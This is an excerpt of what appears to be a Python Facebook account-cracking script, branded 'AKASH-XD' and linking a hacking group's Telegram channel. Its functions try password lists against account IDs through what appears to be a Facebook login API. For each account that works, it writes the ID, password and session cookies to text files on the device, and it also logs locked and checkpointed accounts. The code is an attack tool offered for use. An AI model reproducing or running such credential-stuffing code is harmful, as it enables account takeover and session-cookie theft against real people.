...
██   ██ ██   ██ ██   ██ ███████ ██   ██   V/1.3
\033[38;5;46m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mSCRIPT SEND BY \033[1;91m :   \033[1;92mKALYAN KING
\033[1;91m[\033[1;35m≋\033[1;91m] \033[1;92mFACEBOOK \033[1;91m  :   \033[1;92mMR-AKASH-404
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('xdg-open https://t.me/KGF_TEAM_CYBER');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def file():
    clear()
    print(f'{G1}[{A}≈{G1}]{G1} EXAMPLE {A}➢{G1} /{A}sdcard{G1}/{A}AKASH.txt');linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}AKASH-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}AKASH-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/AKASH-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}AKASH-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}AKASH-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/AKASH-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}AKASH-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/AKASH-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
